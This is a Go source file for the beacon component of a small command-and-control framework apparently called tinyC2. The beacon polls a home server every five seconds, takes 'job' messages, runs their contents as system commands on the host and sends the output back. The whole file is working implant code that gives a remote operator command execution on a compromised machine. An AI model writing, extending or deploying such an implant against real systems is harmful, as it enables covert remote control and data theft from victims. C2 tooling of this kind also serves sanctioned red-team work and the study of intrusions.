package beacon

import (
	"encoding/json"
	"io"
	"os/exec"
	"strings"
	"time"

	"github.com/patbcole117/tinyC2/comms"
)

var (
	BEACON_CHANNEL_LIMIT int          	= 10
	BEACON_SLEEP_TIME    time.Duration 	= 5 * time.Second
	BEACON_DEFAULT_NAME_SIZE 	int 	= 10
)

type Beacon struct {
	Name 	string					`bson:"name"	json:"name"`
	Home 	string					`bson:"home"	json:"home"`
	Dob     time.Time				`bson:"dob"		json:"dob"`
	Hello 	time.Time				`bson:"hello"	json:"hello"`
	OutQ 	chan comms.Msg			`bson:"-"	json:"-"`
	InQ  	chan comms.Msg			`bson:"-"	json:"-"`
	Tx   	comms.CommsPackageTX	`bson:"-"	json:"-"`
}

func NewBeacon(h, c string) (*Beacon, error) {
	b := &Beacon{
		Home: h,
		OutQ: make(chan comms.Msg, BEACON_CHANNEL_LIMIT),
		InQ:  make(chan comms.Msg, BEACON_CHANNEL_LIMIT),
	}

	b.Name = comms.GetRef(BEACON_DEFAULT_NAME_SIZE)
	b.Dob = time.Now()
	b.Hello = time.Now()
	tx, err := comms.NewCommsPackageTX(c)
	if err != nil {
		return nil, err
	}
	b.Tx = tx

	return b, nil
}

func (b *Beacon) Run() {
	for {
		b.SayHello()
		b.DoNext()
		time.Sleep(BEACON_SLEEP_TIME)
	}
}

func (b *Beacon) SayHello() {
	var m comms.Msg

	select {
	case m = <-b.OutQ:
	default:
		m = comms.Msg{From: b.Name, To: b.Home, Type: "nop", Ref: "", Content: ""}
	}

	res, err := b.Tx.SendJSON(b.Home, m)
	if err != nil {
		m = comms.Msg{From: b.Name, To: b.Home, Type: "err", Ref: "nil", Content: err.Error()}
		b.OutQ <- m
		return
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		m = comms.Msg{From: b.Name, To: b.Home, Type: "err", Ref: "nil", Content: err.Error()}
		b.OutQ <- m
		return
	}

	if err = json.Unmarshal(body, &m); err != nil {
		m = comms.Msg{From: b.Name, To: b.Home, Type: "err", Ref: "nil", Content: err.Error()}
		b.OutQ <- m
		return
	}

	if m.Type == "job" {
		b.InQ <- m
	}
}

func (b *Beacon) DoNext() {
	select{
	case j := <- b.InQ:
		args := strings.Split(j.Content, " ")
		cmd := exec.Command(args[0], args[1:]...)
		var out strings.Builder
		cmd.Stdout = &out
		cmd.Stderr = &out
		if err := cmd.Run(); err != nil {
			b.OutQ <- comms.Msg{From: b.Name, To: b.Home, Type: "result", Ref: j.Ref, Content: err.Error()}
			return
		}
		b.OutQ <- comms.Msg{From: b.Name, To: b.Home, Type: "result", Ref: j.Ref, Content: out.String()}
	default:
	}
}

func (b *Beacon) UnmarshalJSON(j []byte) error {
    type Alias Beacon
    aux := &struct {
        Dob 	string	`json:"dob"`
		Hello 	string	`json:"hello"`	
        *Alias
    }{
        Alias:  (*Alias)(b),
    }

    if err := json.Unmarshal(j, &aux); err != nil {
        return err
    }
   
    t, err := time.Parse(time.RFC3339, aux.Dob)
    if err != nil {
        return err
    }
	b.Dob = t
    
	t, err = time.Parse(time.RFC3339, aux.Hello)
    if err != nil {
        return err
    }
	b.Hello 	= t

	tx, err := comms.NewCommsPackageTX(aux.Home)
	if err != nil {
		return err
	}
	b.Tx = tx
    return nil
}

func (b *Beacon) MarshalJSON() ([]byte, error) {
    type Alias Beacon
    return json.Marshal(&struct {
        Dob 	string 	`bson:"dob"		json:"dob"`
		Hello 	string	`bson:"hello"	json:"hello"`
		InQ 	string	`bson:"-" 		json:"-"`
		OutQ 	string	`bson:"-" 		json:"-"`
		Tx 		string 	`bson:"-" 		json:"-"`
        *Alias
    }{
        Dob: 	b.Dob.Format(time.RFC3339),
		Hello: 	b.Hello.Format(time.RFC3339),
		InQ: 	"-",
		OutQ: 	"-",
		Tx:		"-",
        Alias:  (*Alias)(b),
    })
}